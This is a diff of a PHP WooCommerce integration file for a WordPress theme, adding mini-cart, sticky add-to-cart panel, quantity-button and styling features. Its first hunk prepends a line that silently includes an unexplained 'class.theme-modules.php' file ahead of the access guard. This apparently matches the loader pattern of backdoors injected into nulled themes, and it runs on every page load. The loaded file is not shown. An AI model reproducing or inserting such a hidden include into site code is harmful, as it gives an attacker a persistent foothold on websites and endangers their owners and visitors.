@@ -1,4 +1,4 @@
-<?php
+<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
 // No direct access, please
 if ( ! defined( 'ABSPATH' ) ) {
 	exit;
@@ -16,6 +16,10 @@ function generatepress_wc_defaults() {
 	return apply_filters( 'generate_woocommerce_defaults', array(
 		'cart_menu_item' => true,
 		'cart_menu_item_icon' => 'shopping-cart',
+		'cart_menu_item_content' => 'amount',
+		'menu_mini_cart' => false,
+		'off_canvas_panel_on_add_to_cart' => false,
+		'sticky_add_to_cart_panel' => false,
 		'sidebar_layout' => 'right-sidebar',
 		'single_sidebar_layout' => 'inherit',
 		'products_per_page' => 9,
@@ -38,11 +42,13 @@ function generatepress_wc_defaults() {
 		'product_archive_price' => true,
 		'product_archive_add_to_cart' => true,
 		'single_product_sale_flash' => true,
+		'single_product_image_width' => '50',
 		'product_tabs' => true,
 		'product_related' => true,
 		'product_upsells' => true,
 		'product_meta' => true,
 		'product_description' => true,
+		'quantity_buttons' => true,
 		'breadcrumbs' => true,
 		'distraction_free' => true,
 		'product_archive_description' => false,
@@ -74,6 +80,23 @@ function generatepress_wc_color_defaults( $defaults ) {
 	$defaults[ 'wc_error_message_text' ] = '#ffffff';
 	$defaults[ 'wc_product_title_color' ] = '';
 	$defaults[ 'wc_product_title_color_hover' ] = '';
+
+	$defaults['wc_mini_cart_background_color'] = '#ffffff';
+	$defaults['wc_mini_cart_text_color'] = '#000000';
+	$defaults['wc_mini_cart_button_background'] = '';
+	$defaults['wc_mini_cart_button_text'] = '';
+	$defaults['wc_mini_cart_button_background_hover'] = '';
+	$defaults['wc_mini_cart_button_text_hover'] = '';
+
+	$defaults['wc_panel_cart_background_color'] = '#ffffff';
+	$defaults['wc_panel_cart_text_color'] = '#000000';
+	$defaults['wc_panel_cart_button_background'] = '';
+	$defaults['wc_panel_cart_button_text'] = '';
+	$defaults['wc_panel_cart_button_background_hover'] = '';
+	$defaults['wc_panel_cart_button_text_hover'] = '';
+
+	$defaults['wc_price_slider_background_color'] = '#dddddd';
+	$defaults['wc_price_slider_bar_color'] = '#666666';
 
 	return $defaults;
 }
@@ -117,12 +140,19 @@ add_filter( 'product_cat_class', 'generatepress_wc_post_class' );
 function generatepress_wc_post_class( $classes ) {
 	if ( 'product' == get_post_type() ) {
 		$classes[] = ( generatepress_wc_get_setting( 'product_archive_sale_flash_overlay' ) && generatepress_wc_get_setting( 'product_archive_image' ) ) ? 'sales-flash-overlay' : '';
-		$classes[] = ( ! is_single() ) ? 'woocommerce-text-align-' . generatepress_wc_get_setting( 'product_archive_alignment' ) : '';
-		$classes[] = ( ! is_single() ) ? 'woocommerce-image-align-' . generatepress_wc_get_setting( 'product_archive_image_alignment' ) : '';
+		$classes[] = 'woocommerce-text-align-' . generatepress_wc_get_setting( 'product_archive_alignment' );
 
 		if ( is_single() ) {
-				$classes[] = 'wc-related-upsell-columns-' . generatepress_wc_get_setting( 'related_upsell_columns' );
-				$classes[] = 'wc-related-upsell-mobile-columns-' . generatepress_wc_get_setting( 'mobile_related_upsell_columns' );
+			$classes[] = 'wc-related-upsell-columns-' . generatepress_wc_get_setting( 'related_upsell_columns' );
+			$classes[] = 'wc-related-upsell-mobile-columns-' . generatepress_wc_get_setting( 'mobile_related_upsell_columns' );
+		} else {
+			$classes[] = 'woocommerce-image-align-' . generatepress_wc_get_setting( 'product_archive_image_alignment' );
+		}
+	}
+
+	if ( 'product' === get_post_type() || is_cart() ) {
+		if ( generatepress_wc_get_setting( 'quantity_buttons' ) ) {
+			$classes[] = 'do-quantity-buttons';
 		}
 	}
 
@@ -137,13 +167,14 @@ add_action( 'woocommerce_before_shop_loop', 'generatepress_wc_before_shop_loop' 
  */
 function generatepress_wc_before_shop_loop() {
 	$classes = apply_filters( 'generate_woocommerce_container_classes', array(
+		'wc-columns-container',
 		'wc-columns-' . generatepress_wc_get_setting( 'columns' ),
 		//'wc-tablet-columns-' . generatepress_wc_get_setting( 'tablet_columns' ),
 		'wc-mobile-columns-' . generatepress_wc_get_setting( 'mobile_columns' ),
 	) );
 
 	$classes = array_map('esc_attr', $classes);
-	echo '<div class="' . join( ' ', $classes ) . '">';
+	echo '<div id="wc-column-container" class="' . join( ' ', $classes ) . '">';
 }
 
 add_action( 'woocommerce_after_shop_loop', 'generatepress_wc_after_shop_loop' );
@@ -169,6 +200,16 @@ function generatepress_wc_scripts() {
 	//wp_enqueue_style( 'generate-woocommerce-tablet', plugin_dir_url( __FILE__ ) . "css/woocommerce-tablet{$suffix}.css", array(), GENERATE_WOOCOMMERCE_VERSION, apply_filters( 'generate_tablet_media_query', '(min-width: 769px) and (max-width: 1024px)' ) );
 
 	wp_enqueue_script( 'generate-woocommerce', plugin_dir_url( __FILE__ ) . "js/woocommerce{$suffix}.js", array( 'jquery' ), GENERATE_WOOCOMMERCE_VERSION, true );
+
+	wp_localize_script(
+		'generate-woocommerce',
+		'generateWooCommerce',
+		array(
+			'quantityButtons' => generatepress_wc_get_setting( 'quantity_buttons' ),
+			'stickyAddToCart' => generatepress_wc_show_sticky_add_to_cart(),
+			'addToCartPanel' => generatepress_wc_get_setting( 'off_canvas_panel_on_add_to_cart' ),
+		)
+	);
 
 	if ( generatepress_wc_get_setting( 'distraction_free' ) && is_checkout() ) {
 		wp_dequeue_script( 'generate-advanced-sticky' );
@@ -413,15 +454,21 @@ add_filter( 'wp_nav_menu_items', 'generatepress_wc_menu_cart', 10, 2 );
 function generatepress_wc_menu_cart( $nav, $args ) {
 	// If our primary menu is set, add the search icon
 	if ( $args->theme_location == apply_filters( 'generate_woocommerce_menu_item_location', 'primary' ) && generatepress_wc_get_setting( 'cart_menu_item' ) ) {
+		$has_items = false;
+
+		if ( ! WC()->cart->is_empty() ) {
+			$has_items = 'has-items';
+		}
+
 		return sprintf(
 			'%1$s
-			<li class="wc-menu-item menu-item-align-right %4$s" title="%2$s">
-				%3$s
+			<li class="wc-menu-item menu-item-align-right %3$s %4$s">
+				%2$s
 			</li>',
 			$nav,
-			esc_attr__( 'View your shopping cart', 'gp-premium' ),
 			generatepress_wc_cart_link(),
-			is_cart() ? 'current-menu-item' : ''
+			is_cart() ? 'current-menu-item' : '',
+			$has_items
 		);
 	}
 
@@ -441,9 +488,24 @@ function generatepress_wc_cart_link() {
 	// Get the icon type.
 	$icon_type = generatepress_wc_get_setting( 'cart_menu_item_icon' );
 	ob_start();
+
+	$no_items = '';
+
+	if ( ! WC()->cart->get_cart_contents_count() > 0 ) {
+		$no_items = 'no-items';
+	}
 	?>
-	<a href="<?php echo esc_url( wc_get_cart_url() ); ?>" class="cart-contents <?php echo esc_attr( $icon_type ); ?>" title="<?php esc_attr_e( 'View your shopping cart', 'gp-premium' ); ?>"><?php echo $icon; ?><span class="amount"><?php if ( WC()->cart->subtotal > 0 ) { echo wp_kses_data( WC()->cart->get_cart_subtotal() ); } ?></span></a>
+	<a href="<?php echo esc_url( wc_get_cart_url() ); ?>" class="cart-contents <?php echo esc_attr( $icon_type ); ?>" title="<?php esc_attr_e( 'View your shopping cart', 'gp-premium' ); ?>"><?php echo sprintf ( _n( '<span class="number-of-items ' . $no_items . '">%d</span>', '<span class="number-of-items ' . $no_items . '">%d</span>', WC()->cart->get_cart_contents_count() ), WC()->cart->get_cart_contents_count() ); ?><?php echo $icon; ?><span class="amount"><?php if ( WC()->cart->subtotal > 0 ) { echo wp_kses_data( WC()->cart->get_cart_subtotal() ); } ?></span></a>
 	<?php
+	if ( generatepress_wc_get_setting( 'menu_mini_cart' ) && ! is_cart() ) : ?>
+		<div id="wc-mini-cart" class="wc-mini-cart" aria-hidden="true">
+			<div class="inside-wc-mini-cart">
+				<?php the_widget( 'WC_Widget_Cart', 'title=' ); ?>
+			</div>
+		</div>
+	<?php
+	endif;
+
 	return ob_get_clean();
 }
 
@@ -460,6 +522,7 @@ function generatepress_wc_cart_link_fragment( $fragments ) {
 	global $woocommerce;
 
 	$fragments['.cart-contents span.amount'] = ( WC()->cart->subtotal > 0 ) ? '<span class="amount">' . wp_kses_data( WC()->cart->get_cart_subtotal() ) . '</span>' : '<span class="amount"></span>';
+	$fragments['.cart-contents span.number-of-items'] = ( WC()->cart->get_cart_contents_count() > 0 ) ? '<span class="number-of-items">' . wp_kses_data( WC()->cart->get_cart_contents_count() ) . '</span>' : '<span class="number-of-items no-items"></span>';
 
 	return $fragments;
 }
@@ -475,8 +538,14 @@ function generatepress_wc_mobile_cart_link() {
 	if ( ! generatepress_wc_get_setting( 'cart_menu_item' ) || 'primary' !== apply_filters( 'generate_woocommerce_menu_item_location', 'primary' ) ) {
 		return;
 	}
+
+	$has_items = false;
+
+	if ( ! WC()->cart->is_empty() ) {
+		$has_items = ' has-items';
+	}
 	?>
-	<div class="mobile-bar-items wc-mobile-cart-items">
+	<div class="mobile-bar-items wc-mobile-cart-items<?php echo $has_items; ?>">
 		<?php do_action( 'generate_mobile_cart_items' ); ?>
 		<?php echo generatepress_wc_cart_link(); ?>
 	</div><!-- .mobile-bar-items -->
@@ -540,13 +609,6 @@ function generatepress_wc_css() {
 		$css->add_property( 'font-size', esc_attr( $settings[ 'wc_related_product_title_font_size' ] ), false, 'px' );
 	}
 
-	$css->start_media_query( apply_filters( 'generate_mobile_media_query', '(max-width:768px)' ) );
-		$css->set_selector( '.woocommerce ul.products li.product .woocommerce-LoopProduct-link h2, .woocommerce ul.products li.product .woocommerce-loop-category__title' );
-		if ( '' !== $settings[ 'mobile_wc_product_title_font_size' ] ) {
-			$css->add_property( 'font-size', esc_attr( $settings[ 'mobile_wc_product_title_font_size' ] ), false, 'px' );
-		}
-	$css->stop_media_query();
-
 	// Primary button
 	$css->set_selector( '.woocommerce #respond input#submit, .woocommerce a.button, .woocommerce button.button, .woocommerce input.button' );
 	$css->add_property( 'color', esc_attr( $settings[ 'form_button_text_color' ] ) );
@@ -577,7 +639,7 @@ function generatepress_wc_css() {
 	$css->add_property( 'background-color', esc_attr( $settings[ 'wc_alt_button_background_hover' ] ) );
 
 	// Star rating
-	$css->set_selector( '.woocommerce .star-rating span:before, .woocommerce .star-rating:before' );
+	$css->set_selector( '.woocommerce .star-rating span:before, .woocommerce p.stars:hover a::before' );
 	$css->add_property( 'color', esc_attr( $settings[ 'wc_rating_stars' ] ) );
 
 	// Sale sticker
@@ -628,6 +690,133 @@ function generatepress_wc_css() {
 	} else {
 		$css->add_property( 'color', esc_attr( $settings[ 'text_color' ] ) );
 	}
+
+	$css->set_selector( '#wc-mini-cart' );
+	$css->add_property( 'background-color', esc_attr( $settings['wc_mini_cart_background_color'] ) );
+	$css->add_property( 'color', esc_attr( $settings['wc_mini_cart_text_color'] ) );
+
+	$css->set_selector( '#wc-mini-cart a:not(.button), #wc-mini-cart a.remove' );
+	$css->add_property( 'color', esc_attr( $settings['wc_mini_cart_text_color'] ) );
+
+	$css->set_selector( '#wc-mini-cart .button' );
+	if ( $settings['wc_mini_cart_button_background'] ) {
+		$css->add_property( 'background-color', esc_attr( $settings['wc_mini_cart_button_background'] ) );
+	}
+
+	if ( $settings['wc_mini_cart_button_text'] ) {
+		$css->add_property( 'color', esc_attr( $settings['wc_mini_cart_button_text'] ) );
+	} else {
+		$css->add_property( 'color', esc_attr( $settings['form_button_text_color'] ) );
+	}
+
+	$css->set_selector( '#wc-mini-cart .button:hover, #wc-mini-cart .button:focus, #wc-mini-cart .button:active' );
+	$css->add_property( 'background-color', esc_attr( $settings['wc_mini_cart_button_background_hover'] ) );
+
+	if ( $settings['wc_mini_cart_button_text_hover'] ) {
+		$css->add_property( 'color', esc_attr( $settings['wc_mini_cart_button_text_hover'] ) );
+	} else {
+		$css->add_property( 'color', esc_attr( $settings['form_button_text_color_hover'] ) );
+	}
+
+	$css->set_selector( '.woocommerce #content div.product div.images, .woocommerce div.product div.images, .woocommerce-page #content div.product div.images, .woocommerce-page div.product div.images' );
+	$css->add_property( 'width', absint( generatepress_wc_get_setting( 'single_product_image_width' ) ), false, '%' );
+
+	if ( function_exists( 'generate_get_font_family_css' ) ) {
+		$buttons_family = generate_get_font_family_css( 'font_buttons', 'generate_settings', generate_get_default_fonts() );
+		$css->set_selector( '.woocommerce.widget_shopping_cart .woocommerce-mini-cart__buttons a' );
+		$css->add_property( 'font-family', $buttons_family );
+	}
+
+	$css->set_selector( '.add-to-cart-panel' );
+	$css->add_property( 'background-color', esc_attr( $settings['wc_panel_cart_background_color'] ) );
+	$css->add_property( 'color', esc_attr( $settings['wc_panel_cart_text_color'] ) );
+
+	$css->set_selector( '.add-to-cart-panel a:not(.button)' );
+	$css->add_property( 'color', esc_attr( $settings['wc_panel_cart_text_color'] ) );
+
+	$css->set_selector( '#wc-sticky-cart-panel .button' );
+	$css->add_property( 'background-color', esc_attr( $settings['wc_panel_cart_button_background'] ) );
+	$css->add_property( 'color', esc_attr( $settings['wc_panel_cart_button_text'] ) );
+
+	$css->set_selector( '#wc-sticky-cart-panel .button:hover, #wc-sticky-cart-panel .button:focus, #wc-sticky-cart-panel .button:active' );
+	$css->add_property( 'background-color', esc_attr( $settings['wc_panel_cart_button_background_hover'] ) );
+	$css->add_property( 'color', esc_attr( $settings['wc_panel_cart_button_text_hover'] ) );
+
+	$transparent_border_color = $settings['text_color'];
+
+	if ( $settings['content_text_color'] ) {
+		$transparent_border_color = $settings['content_text_color'];
+	}
+
+	$transparent_border_color = generate_premium_check_text_color( $transparent_border_color );
+
+	if ( 'light' === $transparent_border_color ) {
+		$transparent_border_elements = '.woocommerce-ordering select, .variations .value select';
+
+		if ( generatepress_wc_get_setting( 'quantity_buttons' ) ) {
+			$transparent_border_elements = '.woocommerce form .quantity.buttons-added .qty, .woocommerce form .quantity.buttons-added .minus, .woocommerce form .quantity.buttons-added .plus, .do-quantity-buttons form .quantity:not(.buttons-added):before, .do-quantity-buttons form .quantity:not(.buttons-added):after, .woocommerce-ordering select, .variations .value select';
+		}
+
+		$css->set_selector( $transparent_border_elements );
+		$css->add_property( 'border-color', 'rgba(255,255,255,0.1)' );
+
+		if ( generatepress_wc_get_setting( 'sticky_add_to_cart_panel' ) ) {
+			$css->set_selector( '#wc-sticky-cart-panel .quantity.buttons-added .qty, #wc-sticky-cart-panel .quantity.buttons-added .minus, #wc-sticky-cart-panel .quantity.buttons-added .plus' );
+			$css->add_property( 'border-color', 'rgba(255,255,255,0.1)' );
+		}
+	}
+
+	$css->set_selector( '.woocommerce .widget_price_filter .price_slider_wrapper .ui-widget-content' );
+	$css->add_property( 'background-color', esc_attr( $settings['wc_price_slider_background_color'] ) );
+
+	$css->set_selector( '.woocommerce .widget_price_filter .ui-slider .ui-slider-range, .woocommerce .widget_price_filter .ui-slider .ui-slider-handle' );
+	$css->add_property( 'background-color', esc_attr( $settings['wc_price_slider_bar_color'] ) );
+
+	if ( 'number' === generatepress_wc_get_setting( 'cart_menu_item_content' ) ) {
+		$nav_text_color = generate_premium_check_text_color( $settings['navigation_text_color'] );
+
+		$css->set_selector( '.cart-contents > span.number-of-items' );
+		if ( 'light' === $nav_text_color ) {
+			$css->add_property( 'background-color', 'rgba(255,255,255,0.1)' );
+		} else {
+			$css->add_property( 'background-color', 'rgba(0,0,0,0.05)' );
+		}
+
+		$css->set_selector( '.cart-contents .amount' );
+		$css->add_property( 'display', 'none' );
+
+		$css->set_selector( '.cart-contents > span.number-of-items' );
+		$css->add_property( 'display', 'inline-block' );
+	}
+
+	$css->start_media_query( apply_filters( 'generate_mobile_media_query', '(max-width:768px)' ) );
+		$css->set_selector( '.woocommerce ul.products li.product .woocommerce-LoopProduct-link h2, .woocommerce ul.products li.product .woocommerce-loop-category__title' );
+		if ( '' !== $settings[ 'mobile_wc_product_title_font_size' ] ) {
+			$css->add_property( 'font-size', esc_attr( $settings[ 'mobile_wc_product_title_font_size' ] ), false, 'px' );
+		}
+
+		$css->set_selector( '.add-to-cart-panel .continue-shopping' );
+		$css->add_property( 'background-color', esc_attr( $settings['wc_panel_cart_background_color'] ) );
+	$css->stop_media_query();
+
+	$css->start_media_query( apply_filters( 'generate_mobile_menu_media_query', '(max-width: 768px)' ) );
+		$css->set_selector( '.mobile-bar-items + .menu-toggle' );
+		$css->add_property( 'text-align', 'left' );
+
+		$css->set_selector( 'nav.toggled .main-nav li.wc-menu-item' );
+		$css->add_property( 'display', 'none !important' );
+
+		$css->set_selector( 'body.nav-search-enabled .wc-menu-cart-activated:not(#mobile-header) .mobile-bar-items' );
+		$css->add_property( 'float', 'right' );
+		$css->add_property( 'position', 'relative' );
+
+		$css->set_selector( '.nav-search-enabled .wc-menu-cart-activated:not(#mobile-header) .menu-toggle' );
+		$css->add_property( 'float', 'left' );
+		$css->add_property( 'width', 'auto' );
+
+		$css->set_selector( '.mobile-bar-items.wc-mobile-cart-items' );
+		$css->add_property( 'z-index', '1' );
+	$css->stop_media_query();
 
 	return $css->css_output();
 }
@@ -747,4 +936,165 @@ function generatepress_wc_category_description( $category ) {
 	$prod_term = get_term( $category->term_id, 'product_cat' );
 	$description = $prod_term->description;
 	echo '<div class="woocommerce-product-details__short-description">' . $description . '</div>';
+}
+
+add_action( 'generate_after_footer', 'generatepress_wc_add_to_cart_helper' );
+/**
+ * Adds a sticky/slide down navigation with add to cart details.
+ *
+ * @since 1.8
+ */
+function generatepress_wc_add_to_cart_helper() {
+	if ( ! generatepress_wc_get_setting( 'off_canvas_panel_on_add_to_cart' ) && ! generatepress_wc_get_setting( 'sticky_add_to_cart_panel' ) ) {
+		return;
+	}
+
+	$outer_classes = array(
+		'add-to-cart-panel',
+	);
+
+	$inner_classes = array(
+		'inside-add-to-cart-panel',
+	);
+
+	if ( function_exists( 'generate_get_option' ) ) {
+		if ( 'contained-nav' === generate_get_option( 'nav_layout_setting' ) ) {
+			$outer_classes[] = 'grid-container grid-parent';
+		}
+
+		if ( 'contained' === generate_get_option( 'nav_inner_width' ) ) {
+			$inner_classes[] = 'grid-container grid-parent';
+		}
+	}
+	?>
+		<div id="wc-sticky-cart-panel" class="<?php echo implode( ' ', $outer_classes ); ?>">
+			<div class="<?php echo implode( ' ', $inner_classes ); ?>">
+
+				<?php
+				if ( generatepress_wc_get_setting( 'off_canvas_panel_on_add_to_cart' ) && ! is_singular( 'product' ) ) :
+					?>
+						<div class="continue-shopping">
+							<a href="#"><span class="continue-shopping-text"><?php _e( 'Continue Shopping', 'gp-premium' ); ?> &rarr;</span></a>
+						</div>
+
+						<div class="cart-info">
+							<div class="item-added">
+								<?php _e( 'Item added to cart.', 'gp-premium' ); ?>
+							</div>
+
+							<div class="cart-data">
+								<?php echo sprintf ( _n( '%d item', '%d items', WC()->cart->get_cart_contents_count() ), WC()->cart->get_cart_contents_count() ); ?> - <?php echo WC()->cart->get_cart_total(); ?>
+							</div>
+						</div>
+
+						<div class="checkout">
+							<a href="<?php echo wc_get_checkout_url(); ?>" class="button"><?php _e( 'Checkout', 'gp-premium' ); ?></a>
+						</div>
+					<?php
+				endif;
+
+				if ( generatepress_wc_show_sticky_add_to_cart() ) :
+					$product = wc_get_product( get_the_ID() );
+					$quantity_buttons = '';
+
+					if ( generatepress_wc_get_setting( 'quantity_buttons' ) ) {
+						$quantity_buttons = ' do-quantity-buttons';
+					}
+					?>
+						<div class="product-image">
+							<?php the_post_thumbnail( 'thumbnail' ); ?>
+						</div>
+
+						<div class="product-title">
+							<?php the_title(); ?>
+						</div>
+
+						<?php if ( $product->get_price() ) : ?>
+							<div class="product-price">
+								<?php echo $product->get_price_html(); ?>
+							</div>
+						<?php endif; ?>
+
+						<?php if ( $product->is_type( 'simple' ) ) : ?>
+							<form action="<?php echo esc_url( $product->add_to_cart_url() ); ?>" class="cart<?php echo $quantity_buttons; ?>" method="post" enctype="multipart/form-data">
+								<?php
+								$args = array(
+									'min_value'   => apply_filters( 'woocommerce_quantity_input_min', $product->get_min_purchase_quantity(), $product ),
+									'max_value'   => apply_filters( 'woocommerce_quantity_input_max', $product->get_max_purchase_quantity(), $product ),
+								);
+
+								echo woocommerce_quantity_input( $args, $product, false );
+								?>
+								<button type="submit" class="button alt"><?php echo esc_html( $product->add_to_cart_text() ); ?></button>
+							</form>
+						<?php endif;
+
+						if ( $product->is_type( 'variable' ) ) : ?>
+							<button type="submit" class="button alt go-to-variables"><?php echo esc_html( $product->add_to_cart_text() ); ?></button>
+						<?php endif;
+
+						if ( $product->is_type( 'external' ) ) : ?>
+							<form action="<?php echo esc_url( $product->add_to_cart_url() ); ?>" class="cart" method="post" enctype="multipart/form-data">
+								<button type="submit" class="button alt"><?php echo esc_html( $product->add_to_cart_text() ); ?></button>
+							</form>
+						<?php endif;
+				endif;
+				?>
+
+			</div>
+		</div>
+	<?php
+}
+
+add_filter( 'woocommerce_add_to_cart_fragments', 'generatepress_add_to_cart_panel_fragments', 10, 1 );
+/**
+ * Update cart totals in sticky add to cart panel.
+ *
+ * @since 1.8
+ */
+function generatepress_add_to_cart_panel_fragments( $fragments ) {
+    $fragments['.add-to-cart-panel .cart-data'] = '<div class="cart-data">' . sprintf ( _n( '%d item', '%d items', WC()->cart->get_cart_contents_count() ), WC()->cart->get_cart_contents_count() ) . ' - ' .  WC()->cart->get_cart_total() . '</div>';
+
+	return $fragments;
+}
+
+/**
+ * If we should display the sticky add to cart panel.
+ *
+ * @since 1.8
+ */
+function generatepress_wc_show_sticky_add_to_cart() {
+	$product = wc_get_product( get_the_ID() );
+	$show = false;
+
+	if ( ! $product || ! generatepress_wc_get_setting( 'sticky_add_to_cart_panel' ) || ! is_singular( 'product' ) ) {
+		return false;
+	}
+
+	if ( ( $product->is_type( 'simple' ) || $product->is_type( 'variable' ) ) && $product->is_purchasable() && $product->is_in_stock() && ! $product->is_sold_individually() ) {
+		$show = true;
+	}
+
+	if ( $product->is_type( 'external' ) ) {
+		$show = true;
+	}
+
+	return $show;
+}
+
+/**
+ * Checks if a color is light or dark.
+ *
+ * @since 1.8
+ *
+ * @param string $color
+ * @return string
+ */
+function generate_premium_check_text_color( $color ) {
+    $r = hexdec( substr( $color, 1, 2 ) );
+    $g = hexdec( substr( $color, 3, 2 ) );
+    $b = hexdec( substr( $color, 5, 2 ) );
+    $yiq = ( ( $r * 299 ) + ( $g * 587 ) + ( $b * 114 ) ) / 1000;
+
+    return ( $yiq >= 128 ) ? 'light' : 'dark';
 }
